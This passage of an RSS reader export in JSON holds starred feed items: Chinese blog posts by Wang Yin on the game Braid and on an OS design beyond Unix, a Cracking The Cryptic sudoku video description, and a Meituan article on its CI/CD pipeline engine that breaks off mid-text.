    "timestampUsec": "1657728209876305",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Braid - 一个发人深思的游戏",
    "author": ";王垠",
    "published": 1362355200,
    "updated": 1362355200,
    "alternate": [
        {
            "href": "https://www.yinwang.org/blog-cn/2013/03/04/braid",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>Braid - 一个发人深思的游戏</h2>\n            <p><img src=\"http://www.yinwang.org/images/braid1.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p>\n\n<p>我已经很久很久没有打游戏了（如果不算 Angry Birds 之类用来打发时间的游戏的话）。我的最后一个真正意义上的游戏机是 PlayStation 1。在那上面，我真正欣赏的最后一个游戏，是 Metal Gear Solid (1)。</p>\n\n<p>我曾经是一个游戏迷，可是进入了计算机专业的学习之后，我就开始失去对游戏的兴趣，基本上每玩一个都让我失望一次，不管别人把它吹的多么“经典”。不知道为什么，别人玩得津津有味的游戏，我玩一会儿就把它里面的“公式”都看透了。我清楚地知道这游戏的设计者是怎么在“耍我”，在如何想方设法浪费我的时间。</p>\n\n<p>同样的，别人看得津津有味的小说和电影，我经常一看开头就能猜到它要怎么发展，知道这编剧是怎么在胡编滥造，索然无味。所以我基本上不去影院看最新的电影，宁愿在网上看一些几十年前的老电影。我貌似只喜欢那些能让我“猜不透”的东西。</p>\n\n<p>Braid，就是这样一个让我没猜得透的游戏。</p>\n\n<p>这是一个同事推荐的。本来已经对电玩完全失望的我，破例的从 App Store 买了来。玩过之后觉得真的很不错，有一种所谓的“mind blowing”的感觉。以至于我花了两整天时间，废寝忘食，把它给打通关了。</p>\n\n<p>Braid 的主体结构，和最古老的“超级玛丽”没什么两样。一个小人，可以跑，可以跳。一些小怪物，跑来跑去的。你可以跳起来踩它们。</p>\n\n<p>最终的目标，是收集到所有的拼图，然后把它们组合成图片。组合图片是很容易的事情。游戏的难度其实在于如何拿到这些拼图。它们有可能被挂在很高的地方，或者被门挡住。</p>\n\n<p>可是这有什么值得一提的呢？这游戏很不一样的地方是，它给你提供了几种绝无仅有的“超能力”，而且把它们与谜题结合得几乎天衣无缝。</p>\n\n<p>你有三种超能力：</p>\n\n<h3>逆转时间的能力</h3>\n\n<p>在任何时候按下 Shift 键，游戏的时间就会逆转，“undo”之前的所有动作。即使你死了，都是可以复活的。死去的小怪物们也会复活。可是就算这样，有些拼图还是很难拿到。</p>\n\n<p>值得一提的是，时间逆转的时候，画面是流畅无缺损的，连爆炸场面都会“收缩”。更令人赞叹的是，游戏的背景音乐也会同步逆转。如果在时间逆转的时候按“上”，“下”键，就可以调整时间“快退”和“快进”的速度。当然，此时的场景就像录像机在快退或者快进。</p>\n\n<h3>产生“多重现实”的能力</h3>\n\n<p><img src=\"http://www.yinwang.org/images/braid-shadow.jpeg\" alt=\"\" referrerpolicy=\"no-referrer\"></p>\n\n<p>在某些章节，你可以实现“多重现实”。做一个动作，然后按 Shift 键让时间逆转，当你停止逆转的时候，你的影子就会开始“redo”刚才的那段“历史”。而这个时候你可以做一些不同于以前的事情。这就好像有两个世界，一新一旧，从“历史的分叉点”开始，同步交汇。</p>\n\n<p>你必须掌握好时间才能跟影子合作，因为影子的行动速度是不受你的“现场控制”的，它只是按部就班的重演你 undo 掉的历史。</p>\n\n<h3>扭曲时间的指环</h3>\n\n<p><img src=\"http://www.yinwang.org/images/braid-ring.jpeg\" alt=\"\" referrerpolicy=\"no-referrer\"></p>\n\n<p>在某些章节，你会有机会使用一个魔法指环。把这个指环放在地上之后，它会在附近的球状空间中形成时间的“扭曲”。这有点像黑洞的原理。越是靠近指环的位置，时间流动越慢。而当你远离指环，时间就逐渐恢复正常。指环的巧妙使用，是解决这些章节谜题的关键。</p>\n\n<p>同样的，音乐与指环的特异功能是完美配合的。当你靠近指环的时候，背景音乐就会出现相应程度的扭曲。有点像录音机卡带的感觉  :)</p>\n\n<p>在解决了所有的谜题之后，我回味了一下，自己为什么欣赏 Braid。这也许是因为它符合一个优秀的，非低级趣味的游戏设计：屈指可数的简单规则，却可以组合起来，制造出许许多多的变化。</p>\n\n<p>你只有3种超能力，但是如何利用和“组合”这些超能力，却形成了解决谜题的关键。有些题目很有点难度，以至于你会希望有第4种超能力出现，或者希望捡到别的什么“法宝”。可是它们是不存在的。你必须使用那仅有的3种能力，加上巧妙的思索，细心的观察，才能达到目的。在解决了一个很难的谜题之后，你往往会一拍脑袋：哇，我怎么一开头没想到！</p>"
    },
    "origin": {
        "streamId": 12,
        "title": "王垠",
        "htmlUrl": "https://www.yinwang.org/",
        "feedUrl": "https://rsshub.app/blogs/wangyin"
    }
},
{
    "id": "https://www.yinwang.org/blog-cn/2013/04/14/os-design",
    "timestampUsec": "1657728209876323",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "一种新的操作系统设计",
    "author": ";王垠",
    "published": 1365897600,
    "updated": 1365897600,
    "alternate": [
        {
            "href": "https://www.yinwang.org/blog-cn/2013/04/14/os-design",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>一种新的操作系统设计</h2>\n            <p>我一直在试图利用程序语言的设计原理，设计一种超越“Unix 哲学”的操作系统。这里是我的设想：</p>\n\n<ul>\n  <li>\n    <p>这种系统里面的程序间通信不使用无结构的字符串，而是使用带有类型和结构的数据。在这样的系统里面，Unix 和其它类似操作系统（比如 Windows）里的所谓“应用程序”的概念基本上完全消失。系统由一个个很小的“函数”组成，每个函数都可以调用另外一个函数，通过参数传递数据。每个函数都可以手动或者自动并发执行。用现在的系统术语打个比方，这就像是所有代码都是“库”代码，而不存在独立的“可执行文件”。</p>\n  </li>\n  <li>\n    <p>由于参数是数据结构而不是字符串，这避免了程序间通信繁琐的编码和解码过程。使得“进程间通信”变得轻而易举。任何函数都可以调用另一个函数来处理特定类型的数据，这使得像 “OLE 嵌入”这样的机制变得极其简单。</p>\n  </li>\n  <li>\n    <p>所有函数由同一种先进的高级程序语言写成，所以函数间的调用完全不需要“翻译”。不存在 SQL injection 之类由于把程序当成字符串而产生的错误。</p>\n  </li>\n  <li>\n    <p>由于这种语言不允许应用程序使用“指针运算”，应用程序不可能产生 segfault 一类的错误。为了防止不良用户手动在机器码里面加入指针运算，系统的执行的代码不是完全的机器代码，而必须通过进一步的验证和转换之后才会被硬件执行。这有点像 JVM，但它直接运行在硬件之上，所以必须有一些 JVM 没有的功能，比如把内存里的数据结构自动换出到硬盘上，需要的时候再换进内存。</p>\n  </li>\n  <li>\n    <p>由于没有指针运算，系统可以直接使用“实地址”模式进行内存管理，从而不再需要现代处理器提供的内存映射机制以及 TLB。内存的管理粒度是数据结构，而不是页面。这使得内存访问和管理效率大幅提高，而且简化了处理器的设计。据 Kent Dybvig 的经验，这样的系统的内存使用效率要比 Unix 类的系统高一个数量级。</p>\n  </li>\n  <li>\n    <p>系统使用与应用程序相同的高级语言写成，至于“系统调用”，不过是调用另外一个函数。由于只有这些“系统驱动函数”才有对设备的“引用”，又因为系统没有指针运算，所以用户函数不可能绕过系统函数而非法访问硬件。</p>\n  </li>\n  <li>\n    <p>系统没有 Unix 式的“命令行”，它的“shell”其实就是这种高级语言的 REPL。用户可以在终端用可视化的结构编辑方式输入各种函数调用，从而启动进程的运行。所以你不需要像 Unix 一样另外设计一种毛病语言来“粘接”应用程序。</p>\n  </li>\n  <li>\n    <p>所有的数据都作为“结构”，保存在一个分布式的数据共享空间。同样的那个系统语言可以被轻松地发送到远程机器，调用远程机器上的库代码，执行任意复杂的查询索引等动作，取回结果。这种方式可以高效的完成数据库的功能，然而却比数据库简单很多。所谓的“查询语言”（比如 SQL，Datalog，Gremlin，Cypher）其实是多此一举，它们远远不如普通的程序语言强大。说是可以让用户“不需要编程，只提出问题”，然而它们所谓的“优化”是非常局限甚至不可能实现的，带来的麻烦远比直接编程还要多。逻辑式编程语言（比如 Prolog）其实跟 SQL 是一样的问题，一旦遇到复杂点的查询就效率低下。所以系统不使用关系式数据库，不需要 SQL，不需要 NoSQL，不需要 Datalog。</p>\n  </li>\n  <li>\n    <p>由于数据全都是结构化的，所以没有普通操作系统的无结构“文件系统”。数据结构可能通过路径来访问，然而路径不是一个字符串或者字符串模式。系统不使用正则表达式，而是一种类似 NFA 的数据结构，对它们的拆分和组合操作不会出现像字符串那样的问题，比如把 /a/b/ 和 /c/d 串接在一起就变成错误的 /a/b//c/d。</p>\n  </li>\n  <li>\n    <p>所有的数据在合适的时候被自动同步到磁盘，并且进行容错处理，所以即使在机器掉电的情况，绝大部分的数据和进程能够在电源恢复后继续运行。</p>\n  </li>\n  <li>\n    <p>程序员和用户几乎完全不需要知道“数据库”或者“文件系统”的存在。程序假设自己拥有无穷大的空间，可以任意的构造数据。根据硬件的能力，一些手动的存盘操作也可能是有必要的。</p>\n  </li>\n  <li>\n    <p>为了减少数据的移动，系统或者用户可以根据数据的位置，选择： 1）迁移数据，或者 2）迁移处理数据的“进程”。程序员不需要使用 MapReduce，Hadoop 等就能进行大规模并行计算，然而表达能力却比它们强大很多，因为它们全都使用同一种程序语言写成。</p>\n  </li>\n</ul>\n\n<p>我曾经以为我是第一个想到这个做法的人。可是调查之后发现，很多人早就已经做出了类似的系统。Lisp Machine 似乎是其中最接近的一个。<a href=\"http://www.yinwang.org/blog-cn/2013/03/07/oberon\">Oberon</a> 是另外一个。IBM System/38 是类似系统里面最老的一个。最近一些年出现的还有微软的 <a href=\"http://research.microsoft.com/en-us/projects/Singularity\">Singularity</a>，另外还有人试图把 JVM 和 Erlang VM 直接放到硬件上执行。</p>\n\n<p>所以这篇文章的标题其实是错的，这不是一种“新的操作系统设计”。它看起来是新的，只不过因为我们现在用的操作系统忘记了它们本该是什么样子。我也不该说它“超越了 Unix 哲学”，而应该说，所谓的 Unix 哲学其实是历史的倒退。</p>"
    },
    "origin": {
        "streamId": 12,
        "title": "王垠",
        "htmlUrl": "https://www.yinwang.org/",
        "feedUrl": "https://rsshub.app/blogs/wangyin"
    }
},
{
    "id": "yt:video:DVR6FK_pklQ",
    "timestampUsec": "1658002395967950",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Maximum Difficulty = THIS!",
    "author": ";Cracking The Cryptic",
    "published": 1657999800,
    "updated": 1657999800,
    "alternate": [
        {
            "href": "https://www.youtube.com/watch?v=DVR6FK_pklQ",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div class=\"enclosure\"><p class=\"enclosure-title\">Maximum Difficulty = THIS!</p><p><img class=\"enclosure-thumbnail\" src=\"https://i1.ytimg.com/vi/DVR6FK_pklQ/hqdefault.jpg\" alt=\"\" /></p><p class=\"enclosure-content\"><a download=\"\" href=\"https://www.youtube.com/v/DVR6FK_pklQ?version=3\">💾</a></p><p class=\"enclosure-description\">*** STOP PRESS ***\nOur new app is OUT on App Store AND Android!!  We've completely revamped the interface.  Now you download the basic app free and you can choose to download additional content.  So there's a FREE pack of puzzles by Prasanna Seshadri and a paid pack: DOMINO SUDOKU!!! Prasanna's free pack includes one puzzle for each variant of our existing apps (so there's a killer sudoku, a miracle sudoku, a thermo sudoku, etc). Domino Sudoku is a pack of 100 handmade puzzles (40 on launch, 5 added each month for a year) by some of the best constructors in the World: Phistomefel, clover, jovi_al, Christoph Seeliger, Qodec, Sam Cappleman-Lynes and Richard Stolk have all contributed sudokus!! \n\nhttps://apps.apple.com/us/app/cracking-the-cryptic/id1629992934\n\nhttps://play.google.com/store/apps/details?id=com.StudioGoya.CrackingTheCryptic\n\nThe app is coming very soon to Steam as well.\n\n*** TODAY'S PUZZLE ***\nThis puzzle is sitting pretty on Logic Masters Germany with a 100% approval rating from the few hardy souls who have managed to solve it.  It also carries the feared 5/5 difficulty rating.  It's called Vault Construction and it's the work of the_cogito.  This is an extraordinary (and extraordinarily difficult) sudoku.  Good luck!\n\nPlay the puzzle at the link below: \nhttps://tinyurl.com/2tcfan5c\n\nWe hear some viewers have trouble with tinyurl links at the moment so here is a normal link too:\nhttps://app.crackingthecryptic.com/sudoku/d8Qpr2r36t\n\nRules: \nPlace the digits 1 to 9 once each into every row, column and region. Regions need to be discovered and consist of 9 orthogonally connected cells. Pink cages are &quot;vaults&quot;. Digits MAY repeat within a vault. Any digits within a vault may not appear in any cells orthogonally adjacent to that vault. The largest digit in any given vault is equal to the number of distinct regions passing through that vault.\n\n\nThe puzzle pack to celebrate 7000 puzzles on the Fan Discord can be played here:\n\nhttps://tinyurl.com/7WondersPuzzles\n\n\n*** PATREON REWARDS JUST OUT ***\n\nWe've just released a brand new Sudoku Hunt from Joseph Nehme themed around Equal Sum Lines!  With 13 puzzles in all, this is just a wonderful collection of puzzles.  Do have a go if you can.\n\nJust $2/month here:\n\nhttps://www.patreon.com/crackingthecryptic\n\n▶ Contact Us ◀\n\nTwitter:  @Cracking The Cryptic  \nemail: crackingthecryptic@gmail.com\n\nOur PO Box address:\n\nSimon Anthony &amp; Mark Goodliffe \nBox 102\n56 Gloucester Road \nLondon\nSW7 4UB\n\n(Please note to use our real names rather than 'Cracking The Cryptic'.)\n\n▶ SUDOKU PAD - Our New App  ◀\n\nIt's OUT on Windows (released yesterday!) via Steam here:\nhttps://store.steampowered.com/app/1706870/Svens_SudokuPad/\n\nYou can now input your own classic sudoku puzzles into our software using our new App!  The app also comes with 12 handmade puzzles from us and we're also releasing occasional bonus puzzles too.  Already available on IOS and Android.\n\n**************************************************************\n\n▶ OUR ARROW SUDOKU APP IS OUT ON ALL PLATFORMS!\nHere are the links:\nSteam:\nhttps://store.steampowered.com/app/1613680/Arrow_Sudoku/\nApp Store:\nhttps://apps.apple.com/us/app/arrow-sudoku/id1568407537\nGoogle Play:\nhttps://play.google.com/store/apps/details?id=com.StudioGoya.ArrowSudoku\n\n▶ OUR KILLER SUDOKU APP IS OUT ON ALL PLATFORMS◀\nhttps://apps.apple.com/us/app/killer-sudoku-ctc/id1544165118\n\nhttps://store.steampowered.com/app/1471910/Killer_Sudoku/\nhttps://play.google.com/store/apps/details?id=com.StudioGoya.KillerSudoku&amp;hl=en_US&amp;gl=US\n\n▶  SIMON REACTION BOARD (!) ◀\nWith thanks to Andrea for creating this :)\nhttps://simonreacts.avris.it/\n\n▶ CTC FAN DISCORD SERVER◀\nhttps://discord.gg/BbN89j5\n\nNEW:  Guide To Our Discord Server:\nhttps://tinyurl.com/CTCDiscordGuide\n\n▶ OUR BACK CATALOGUE – ALL CATEGORISED WITH LINKS!◀\nhttps://tinyurl.com/CTCCatalogue\n\n▶ *NEW* CRACKING THE CRYPTIC MERCHANDISE◀ \nhttps://teespring.com/en-GB/stores/cracking-the-cryptic\n\n▶TRY OUR CLASSIC SUDOKU APP◀\nAppStore: https://apps.apple.com/us/app/classic-sudoku/id1488838275?ls=1\nSteam: https://store.steampowered.com/app/1188330/Classic_Sudoku/\nAndroid: https://play.google.com/store/apps/details?id=com.StudioGoya.ClassicSudoku&amp;hl=en_US\n\n▶TRY OUR SANDWICH SUDOKU APP◀\nAppStore: https://apps.apple.com/us/app/sandwich-sudoku/id1476116705?ls=1 \nSteam: https://store.steampowered.com/app/1117310/Sandwich_Sudoku/  \nAndroid: https://play.google.com/store/apps/details?id=com.StudioGoya.SandwichSudoku\n\n▶SEND US PUZZLES TO SOLVE/CONTACT US◀\ncrackingthecryptic@gmail.com\n\n▶FOLLOW US◀\nTwitter: #crypticcracking \n@crypticcracking\nInstagram (for how to solve daily clues from The Times): https://www.instagram.com/crackingthecryptic/?hl=en\n\n▶Logo Design◀\nMelvyn Mainini</p></div>\n"
    },
    "origin": {
        "streamId": 14,
        "title": "Cracking The Cryptic",
        "htmlUrl": "https://www.youtube.com/channel/UCC-UOdK8-mIjxBQm_ot1T-Q",
        "feedUrl": "https://www.youtube.com/feeds/videos.xml?channel_id=UCC-UOdK8-mIjxBQm_ot1T-Q"
    }
},
{
    "id": "https://tech.meituan.com/2022/07/14/cicd-pipeline.html",
    "timestampUsec": "1658115798696118",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "工程效能CI/CD之流水线引擎的建设实践",
    "author": ";美团技术团队",
    "published": 1657756800,
    "updated": 1657756800,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/07/14/cicd-pipeline.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>1. 背景</h2><p>持续交付这个概念最早在2006年敏捷大会上被提出，经过多年的发展，目前已成为很多技术团队提升研发效能的必经之路。通过建设部署流水线，打通从代码开发到功能交付的整个环节，以自动化的方式完成构建、测试、集成、发布等一系列行为，最终实现向用户持续高效地交付价值。</p><p>流水线引擎作为支撑部署流水线的底座，它的好坏直接影响着部署流水线建设的水平。业界通常的做法是通过Jenkins、GitlabCI等开源工具（或公有云产品）进行搭建，这是一条能帮助业务快速落地持续交付的道路，美团早期也是采用搭建Jenkins的方式来快速支撑业务。</p><p>但随着越来越多业务开始做持续交付的建设，这种“短平快”方式的弊端逐渐显现。比如，工具建设没有统一的标准，各业务都需要去了解整个工具链的细节，建设成本高、水平参差不齐，很少有业务能搭建完整的部署流水线。同时，业务每天的构建量都在快速增长，逐渐超过Jenkins等开源工具所能承受的极限，在交付高峰期任务严重排队、服务不可用现象频出，严重影响着业务交付的顺畅度。</p><p>美团在流水线引擎的建设层面大概经历了几个阶段。在2019年以前，主要围绕Jenkins进行优化，2019年开始正式立项打造自研的流水线引擎，大致的历程如下：</p><ul><li><strong>第一阶段（2014-2015）</strong>：搭建Jenkins统一集群，解决业务接入的通用问题（如单点登录、代码仓库集成、消息通知、执行机的动态扩缩等），降低业务的建设成本。</li><li><strong>第二阶段（2016-2018）</strong>：拆分多个Jenkins集群，解决业务增长导致单集群性能瓶颈。最多时有十几个集群，这些集群通常是按业务线维度划分，并由业务自行建设。但随着时间的推移，集群的拆分管理难度越来越大，Jenkins安全隐患频出，对平台方造成了很大的运维负担。</li><li><strong>第三阶段（2019-至今）</strong>：为了彻底解决引擎单机瓶颈和工具重复建设问题，我们开始自研分布式流水线引擎（美团内部项目名称为Pipeline），并逐步收敛各业务依赖的底层基建。</li></ul><p>经过3年左右的建设打磨，流水线引擎完成了服务端的基建统一，涵盖<strong>到店、到家、大众点评、美团优选、美团平台、自动配送车、基础研发平台</strong>等几乎所有的业务，支持Java、C++、NodeJS、Golang等多种语言。在性能和稳定性方面，引擎每日支撑<strong>近十万次</strong>的流水线执行量（作业调度峰值每小时达上万次），系统成功率保持在<strong>99.99%</strong>以上（排除业务代码自身原因和第三方工具的问题）。</p><p>下面我们主要介绍下我们在自研引擎建设上遇到的挑战以及对应的解决方案。</p><h2>2. 问题及思路</h2><h3>2.1 业务介绍</h3><p><strong>1）什么是流水线</strong></p><p>我们可以把流水线的执行看作是对代码一步步加工，最终交付到线上的过程。根据业务定义的顺序关系，依次执行相应的加工或质量校验行为（如构建、代码扫描、接口测试、部署工具等），整个执行过程类似一个有向无环图。</p><p><img src=\"https://p0.meituan.net/travelcube/41d94d7d01a6a09ee2a41b6173d076d633107.png\" alt=\"图1 流水线概念\" referrerpolicy=\"no-referrer\"></p><p><strong>2）基本概念</strong></p><ul><li><strong>组件</strong>：出于代码复用和业务共享的考虑，我们将某一工具的操作行为封装成一个组件，表示对于一项具体的加工或校验行为。通过组件方式，业务可以便捷地使用已集成的质量工具（如静态代码扫描、安全漏洞分析等），减少在同一工具上的重复开发成本；对于不满足需求的场景，业务可以自定义一个新的组件。</li><li><strong>组件作业</strong>：表示组件的一次运行实例。</li><li><strong>资源</strong>：为组件作业分配的一个可执行环境。</li><li><strong>流水线编排</strong>：表示流水线中不同组件执行的先后顺序。</li><li><strong>引擎</strong>：负责调度所有的组件作业，为其分配相应的执行资源，保证流水线执行按预期完成。</li></ul><h3>2.2 主要挑战</h3><p><strong>1）调度效率瓶颈</strong></p><p>对调度时间相对敏感，流水线大部分是短时作业（作业持续数十秒到分钟不等），如果调度时间过长，业务能明显感知到流水线执行变慢了。我们需要保证作业调度时间在一个可控的范围内，避免出现调度瓶颈。</p><ul><li>从业务场景考虑，调度逻辑存在一定的业务复杂性（如组件串并行判断、优先级抢占、降级跳过、复用上一次结果等），不仅仅是作业与资源的匹配计算，作业调度耗时存在一定的业务开销。</li><li>引擎支撑公司每天近十万次的执行量，峰值量情况下，并发调度的作业量大，常见的开源工具（Jenkins/GitLab CI/Tekton等）都是采用单体调度模式，作业是串行调度的，容易出现调度瓶颈。</li></ul><p><strong>2）资源分配问题</strong></p><p>对于作业系统来说，作业数通常都是大于资源数的（真实部署情况，资源不是无限的），作业积压是系统设计时必须考虑的问题。如何在有限的资源下，尽可能提高作业的吞吐能力，同时降低在资源不足情况时造成对核心业务场景的影响。</p><ul><li>如果只依靠动态扩容，容易出现资源不足时无法扩容、作业排队等待的情况。特别是对于依赖流水线做研发卡控的业务，这会直接阻塞业务的上线流程。</li><li>出于执行耗时的考虑，大部分资源采用预部署的方式，缩短资源申请和应用启动的准备时间。而对于预部署的资源，如何进行有效划分，既保证每类资源都有一定配额，同时也避免出现部分资源利用率过低，影响作业整体的吞吐能力。</li><li>不是所有工具的执行资源都由引擎管理（如发布系统，部署任务的资源管理是单独的），在作业的资源分配上，还需要考虑不同的资源管理方式。</li></ul><p><strong>3）工具差异化问题</strong></p><p>公司内不同业务的差异化大，涉及的质效类工具众多，如何设计一个合适的插件化架构，满足不同工具的接入需求。</p><ul><li>不同工具实现形式差异化大，有些工具有独立的平台，可以通过接口方式进行集成，有些仅仅是一段代码片段，还需要提供相应的运行环境。面对不同的接入形态，引擎如何屏蔽不同工具带来的差异，使业务在编排流水线时不用关注到工具的实现细节。</li><li>随着业务场景的不断丰富，组件执行还会涉及人工交互（审批场景）、支持重试、异步处理、故障恢复等能力，这些能力的扩展如何尽可能减少对系统的冲击，降低实现的复杂度。</li></ul><h3>2.3 解决思路</h3><p><strong>1）拆分调度决策与资源分配，解决调度效率瓶颈</strong></p><p>从上述分析，一个作业的实际调度耗时 = 单个作业的调度耗时 * 待调度的作业数。因为单个作业的调度耗时会受具体的业务逻辑影响，不确定性大，优化空间有限。而串行调度问题相对明确，在作业调度时间和数量不可控的情况下，是一个合适的优化方向。</p><p>关于串行调度，业界常见的做法是按照业务线维度拆分多个集群，分摊总的调度压力。但这种方式存在的问题是资源分配不具备灵活性，很容易出现资源的分配不均，在整体资源不足时，无法从全局上考虑高优作业的资源分配。并且，多集群管理（新增集群/拆分现有集群）也是不小的运维负担。</p><p>进一步分析，串行调度主要是为了避免资源竞争问题，获得相对最优的资源。这对于流水线场景（作业量大于资源量且都是短时作业），资源最优解不是强诉求。并且，资源量的并发度相对作业量更可控，根据作业执行快慢不同，我们通过主动拉取作业的方式，控制拉取的数量和频率，从而有效降低了资源竞争的情况。</p><p>最终，我们在设计上采取了调度决策与资源分配分离的模式：</p><ul><li><strong>调度决策</strong>：负责计算出可以调度的作业，提交决策，等待合适的资源来执行。该模块具体水平扩展，分担调度决策的压力。</li><li><strong>资源分配</strong>：负责维护作业与资源的关系，通过主动拉取作业的方式，资源可以向任意的实例拉取作业，取消了原先串行分配资源的单点限制。</li></ul><p>在这种模式下，作业调度、资源分配都具备水平扩展能力，拥有更高的性能和系统可用性。也利于作业调度的逻辑能够独立演进，便于开发、测试以及灰度上线。</p><p><strong>2）引入资源池管理模式，实现资源的灵活分配</strong></p><p>考虑到不是所有资源都由引擎管理，我们引入资源池的概念来屏蔽不同资源方式的差异，每个资源池代表一类资源的集合，不同资源池的资源管理方式可以是多样化的。通过该方式，我们将资源分配的问题简化为作业与资源池的匹配问题，根据作业的实际情况，合理设置不同的资源池大小，并配合监控手段对资源池进行动态调整。</p><p>在具体措施上，我们选择“标签”的方式建立作业与资源池的匹配关系，通过从作业与资源两个维度来满足上述条件。</p><ul><li>在作业端，作业基于标签属性拆分到不同的作业队列，并引入优先级概念，保证每个队列中作业按优先级高低被拉取到，避免在积压时，高优作业排在后面无法被及时处理，阻塞业务研发流程。</li><li>在资源端，结合资源的实际场景，提供三种不同的资源池管理方式，以解决不同资源类型的配额和利用率问题。<ul><li>预置的公共资源，这部分资源会提前在资源池上扩容出来，主要应对业务高频使用的且对时间敏感的组件作业。在资源配额和利用率上，根据资源池的历史情况和实时监控，动态调整不同资源池的大小。</li><li>按需使用的资源，主要针对公共资源环境不满足的情况，业务需要自定义资源环境，考虑到这部分作业的体量不大，直接采用实时扩容的方式，相比预置资源的方式，可以获得更好的资源利用率。</li><li>外部平台的资源，这些资源的管理平台方比我们更有经验，平台方通过控制向引擎拉取作业的频率和数量，自行管理作业的吞吐情况。</li></ul></li></ul><p><strong>3）引入组件的分层设计，满足工具差异化需求</strong></p><p>为了保持工具接入的自由度，引擎提供了作业维度最基本的操作接口（拉取作业、查询作业状态、上报作业结果），不同工具可以根据作业接口形式实现定制化的组件开发。</p><p>组件开发主要涉及①实现业务逻辑和②确定交付方式两部分工作，而与引擎的系统交互相对是标准的。我们根据组件执行过程进行分层设计，拆分出业务逻辑、系统交互与执行资源三层。在向引擎屏蔽工具实现细节的同时，可以更好地满足多样化的接入场景。</p><ul><li>系统交互层，该层相对组件开发者是透明的，根据引擎提供的接口制定统一的流程交互标准，以向引擎屏蔽不同组件的实现差异。</li><li>执行资源层，主要解决工具运行方式的差异化，通过支持多种组件交付形式（如镜像、插件安装、独立服务）满足工具与引擎的不同集成方式。</li><li>业务逻辑层，针对业务不同的开发场景，采用多种适配器的选择，来满足业务不同的开发诉求。</li></ul><h2>3. 整体架构</h2><p><img src=\"https://p0.meituan.net/travelcube/758865a4f50abbdb742ad9119aea61a8243063.png\" alt=\"图2 流水线架构\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>触发器</strong>：作为流水线的触发入口，管理多种触发源及触发规则（Pull Request、Git Push、API 触发、定时触发等）。</li><li><strong>任务中心</strong>：管理流水线构建过程中的运行实例，提供流水线运行、中止、重试、组件作业结果上报等操作。</li><li><strong>决策者</strong>：对所有等待调度的作业进行决策，并将决策结果同步给任务中心，由任务中心进行作业状态的变更。</li><li><strong>Worker</strong>：负责向任务中心拉取可执行的作业，并为作业分配具体的执行资源。</li><li><strong>组件SDK</strong>：作为执行组件业务逻辑的壳，负责真正调起组件，完成组件初始化与状态同步的系统交互。</li></ul><h2>4. 核心设计点</h2><h3>4.1 作业调度设计</h3><p><strong>1）调度过程</strong></p><p>下面，我们以一个简单的流水线调度示例（源码检出 - [并行：代码扫描，构建] - 部署），来介绍调度设计中各模块的协作过程。</p><p><img src=\"https://p0.meituan.net/travelcube/9fb69543903cef3bc06d309f664884bf168278.png\" alt=\"图3 调度过程\" referrerpolicy=\"no-referrer\"></p><p>大致逻辑如下：</p><ol><li>当触发流水线构建后，系统会在<strong>任务中心</strong>创建该编排所要执行的所有组件作业。并且将作业状态的变化以事件方式通知决策者进行决策。</li><li><strong>决策者</strong>接收决策事件，根据决策算法计算出可被调度的作业，向<strong>任务中心</strong>提交作业的状态变更请求。</li><li><strong>任务中心</strong>接收决策请求，完成作业状态变更（作业状态变更为已决策），同时加入相应的等待队列。</li><li><strong>Worker</strong> 通过长轮询方式拉取到和自己匹配的等待队列的作业，开始执行作业，执行完成后将结果上报给<strong>任务中心</strong>。</li><li><strong>任务中心</strong>根据Worker上报的作业执行结果变更作业状态，同时向<strong>决策者</strong>发起下一轮决策。</li><li>以此反复，直至流水线下所有作业都已执行完成或出现作业失败的情况，对流水线进行最终决策，结束本次执行。</li></ol><p>整个过程中，任务中心作为一个分布式存储服务，统一维护流水线和作业的状态信息，以API方式与其他模块进行交互。而决策者和Worker通过监听作业状态的变化执行相应的逻辑。</p><p><strong>2）作业状态流转</strong></p><p>下面是一个作业完整的状态机，我们通过作业决策、拉取、ACK以及结果上报一系列事件，最终完成作业从初始状态向完结状态的流转过程。</p><blockquote><p>状态机在接收某种状态转移的事件（Event）后，将当前状态转移至下一个状态（Transition），并执行相应的转移动作（Action）。</p></blockquote><p><img src=\"https://p0.meituan.net/travelcube/cab933e32a3857a55eaf8874f0453cc3229665.png\" alt=\"图4 状态机\" referrerpolicy=\"no-referrer\"></p><p>在实际场景中，由于调度过程涉及链路长、各环节稳定性无法完全保证，容易产生因异常情况导致状态不流转的情况。为此，在设计上利用数据库保证状态变更的正确性，同时为非完结状态作业设立相应的补偿机制，确保任一环节异常后作业可以恢复正确流转。</p><p>我们重点从<strong>作业决策</strong>和<strong>作业拉取</strong>这两个关键过程来看状态流转过程可能出现的问题，以及在设计上是如何解决的。</p><p><strong>作业决策过程</strong>：任务中心接收调度作业的决策，将可调度的作业从unstart变为pending状态，同时将作业加入等待队列，等待被拉取。</p><p><img src=\"https://p1.meituan.net/travelcube/0d86af5b530d2cf53f788a136289d66d54492.png\" alt=\"图5 状态机-决策\" 